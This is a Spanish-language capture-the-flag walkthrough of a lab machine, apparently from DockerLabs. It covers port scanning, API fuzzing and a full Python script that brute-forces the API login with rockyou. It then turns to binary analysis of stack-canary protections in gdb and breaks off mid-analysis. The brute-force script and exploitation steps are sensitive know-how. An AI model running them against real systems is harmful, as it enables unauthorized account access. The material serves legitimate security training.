## Enumeracion de Puertos, Servicios y Versiones

```bash
nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 172.17.0.2
```

![image](https://github.com/user-attachments/assets/1f313174-c9b0-4962-8a18-358873b3e4d1)

observams los puertos 22 y 80 levantados y vemos que el servicio web redirecciona al dominio `http://cybersec.dl` asi que lo agregamos al archivo `/etc/hosts`

```bash
echo '172.17.0.2 cybersec.dl' >> /etc/hosts
```

ahora chequeamos la web

![image](https://github.com/user-attachments/assets/93951116-7cf1-48f8-a2c5-7008f0f2d60e)

resulta ser la web de una empresa de Ciberseguidad, inspecciono el codigo funete pero no observo nada, sin embago si inspeccionamos un poco mas veremos que hace uso de
una `api`

![image](https://github.com/user-attachments/assets/f3447ba9-5b85-4ed7-9cff-94693a375776)

Parece ser que es un `api` que se encarga de generar las password que se muestran en la web, asi que tenemos por donde tirar y ver si conseguimos algo mas `http://cybersec.dl/api/...`
por lo que hace fuzzing en este punto a ver si consigo algo mas

```bash
feroxbuster -u http://cybersec.dl/api/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x txt,php,bak,db,py,html,js,jpg,png,git,sh -t 200 --random-agent --no-state -d 5
```

![image](https://github.com/user-attachments/assets/81cf5a72-a9db-40c3-9cfc-429bf6826ed7)

sin mucho problema localizamos un punto final, asi que testeamos

![image](https://github.com/user-attachments/assets/fb52d54c-df14-49c1-b841-322b89e77a1d)

vemos que nos dice metodo no permitido y es porque se envia una solicitud `GET` y espera una `POST`, para intentar autenticarme lo que hare sera un script en python
que relice un ataque de diccionario contra la `api` a ver si consigo algo

```python
import requests
import json

# URL de la API
url = 'http://cybersec.dl/api/login'

# Función para leer una wordlist desde un archivo
def leer_wordlist(file_path):
    with open(file_path, 'r', encoding='latin-1') as file:
        return [line.strip() for line in file]

# Función para realizar el ataque de fuerza bruta
def brute_force_attack(usernames, passwords):
    headers = {
        'Content-Type': 'application/json'
    }
    for username in usernames:
        for password in passwords:
            data = {
                'username': username,
                'password': password
            }
            response = requests.post(url, headers=headers, data=json.dumps(data))

            # Verificar si la respuesta indica un inicio de sesión exitoso
            if 'success' in response.text:
                print(f'[+] ¡Credenciales encontradas! Usuario: {username}, Contraseña: {password}')
                return
            else:
                print(f'[-] Fallido: Usuario: {username}, Contraseña: {password}')

    print('[-] No se encontraron credenciales válidas.')

# Especificar las rutas de las wordlists
usernames_file = 'usernames.txt'
passwords_file = '/usr/share/wordlists/rockyou.txt'

# Leer las wordlists
usernames = leer_wordlist(usernames_file)
passwords = leer_wordlist(passwords_file)

# Ejecutar el ataque de fuerza bruta
brute_force_attack(usernames, passwords)
```
creo la wordlist de usuarios comunes tales como `admin`, `administator`, `administrador`... y ejecuto el script


```bash
python3 brute-force-api.py
```

![image](https://github.com/user-attachments/assets/5bacda20-73fc-43f7-ae90-c1de8786d5db)

estaba muy debil las credenciales ya que se localizan con mucha rapidez, capturo una peticion con burpsuite

![image](https://github.com/user-attachments/assets/1dd920df-b231-4262-9af9-8a518fb08c9a)

la modifico para enviar las crdenciales obtenidas y observamos la informacion que devuelve

![image](https://github.com/user-attachments/assets/0457875f-89de-46bd-9cdf-7e511bf02987)

de la informacion extraida, lo mas interesante para nosotros es la `url` que se expone `http://cybersec.dl/555555555555509.txt` asi que accedemos al archivo txt

![image](https://github.com/user-attachments/assets/561156f7-b486-4379-b73e-4e5e715ae049)

aqui ya podriamos tener 2 posibles usuarios, lo otro que resulta de interes es la referencia donde carga el binario > `bin` <, `bin` podria ser el directorio `/bin` en 
linux asi como un posible directorio o subdirectorio, pero al testear no resulta ser un directorio asi que testeo agregando el subdominio `bin.cybersec.dl` al archivo
`/etc/hosts` y logro acceder a un panel de descarga con lo que parece ser el binario del texto

![image](https://github.com/user-attachments/assets/3c6db733-c0d8-4765-9fb6-a2fb9211259e)

si descargo el binario y comienzo analizarlo, en principio no parece ser muy util

![image](https://github.com/user-attachments/assets/1307bdf2-863e-4dea-84c8-ef512cd78a0d)

testeo si alguna entrada es vulnerable a un bof

![image](https://github.com/user-attachments/assets/93949671-dda7-41ee-858f-322a80436b18)

resulta ser vulnerable a un bof y por el mensaje de error ya podemos deducir que tiene la proteccion `canary` activa, asi que chequeamos las protecciones

```bash
checksec --file=smashing 
```

![image](https://github.com/user-attachments/assets/355734ac-c09d-4d1a-8e53-96c5839e6665)

se observan todas las protecciones del binario activas, parece ser que tendra su complejidad, primero chequeo si tiene presente la vulnerabilidad `format string` a ver
si podria likear direcciones de memoria

![image](https://github.com/user-attachments/assets/8977d013-7ede-4e91-8a60-1bf78e1d18fd)

no esta presente, aunque si estuviera presente igual no serviria de nada debido a que la primera entrada es la vulnerable al bof por lo que en la sigueinte entrada no
podriamos tomar control del binario por no ser vulnerable en ese punto asi que toca por otra via intentar explotar dicho binario pero primero un poco de ingenieria inversa
para observar como se compone internamente

![image](https://github.com/user-attachments/assets/076325ef-1c04-4d65-963b-06a6b55912d2)

a primera vista se observa que contiene muchas funciones que al parecer nunca se llaman en el flujo normal del programa por lo que esto debe tratarse de codigo basura, asi
que tocara ir analizando funcion por funcion para determinar cual o cuales podrian ser de interes para la explotacion...

![image](https://github.com/user-attachments/assets/100777e6-0d8e-4465-a00d-64ef935d69e8)

despues de un rato analizando el binario no se ve por ahora nda de interes, la funcion intel aunque cuenta con la ejecucion de una shell, no funciona para nada ya que el
binario no tiene conexion remota como para poder obtener acceso mediante esta funcion, aparde de ejecutar el comando `chmod` que deja vulnerable mi sistema si llegara a
ejecutarse... por lo que continuamos analizando el binario y observo que la funcion que se llama en la ejecucion normal del binario es `factor2()`

![image](https://github.com/user-attachments/assets/dee060c5-462f-46bf-be38-bb490dcfdb30)

por otro lado observo la funcion `factor1()` que podria llegar a ser de interes ya que esta concatenando informacion e imprimiendo

![image](https://github.com/user-attachments/assets/3958ba2e-111c-466c-b325-3d5e922941b4)

incluso se puede observar un `printf` imprimiendo "info" + la informacion que podria ser de interes asi que nos sentraremos en esta funcion para intentar saltar a ella
e imprimir dicho mensaje... por lo que corremos el binario con el depurador `gdb` para un analisis mas profundo...

### Analisis con GDB

corremos el binario

```bash
gdb ./smashing -q
```

desensamblamos la funcion de interes `factor1()`

![image](https://github.com/user-attachments/assets/3d4a8df7-f12e-4687-8bf2-417a52c4d518)

aqui ya podemos ver donde se localiza el canary, esta en la direccion de memoria `rbp-0x8`

![image](https://github.com/user-attachments/assets/38538e46-551d-46cb-93d3-40be6317947c)

ya que sabemos donde se localiza en memoria el canary, testearemos la extraccion del canary, primero colocamos un breakpoint en la funcion principal `main()`, corremos
el binario para que se detenga en el breakpoint y continueamos analizando desensamblando la funcion `factor2` ya que es a donde salta desde `main()`

![image](https://github.com/user-attachments/assets/12e23eed-57f8-4588-a608-4e2c8d87b7dd)

aqui ya vemos las direcciones de memoria aleatorizadas por lo que podemos tomar una direccion despues de que se mueva el canary desde el registro `RAX` a `rbp-0x8`

![image](https://github.com/user-attachments/assets/72c0b1a6-9d5a-4467-a582-9940d962bf83)

coloco un nuevo breakpoint en la direccion `0x00005555555562f9`

![image](https://github.com/user-attachments/assets/1d46e000-aa78-4d87-b386-fb820d27c3e0)

vemos que despues de continuar la ejecucion del programa, se detiene en el segundo breakpoint que nos permitira obtener el canary

![image](https://github.com/user-attachments/assets/0ca82470-e33e-4e22-8dd0-709ed0d7e10c)

para confirmar esto inspeccionamos la memoria
























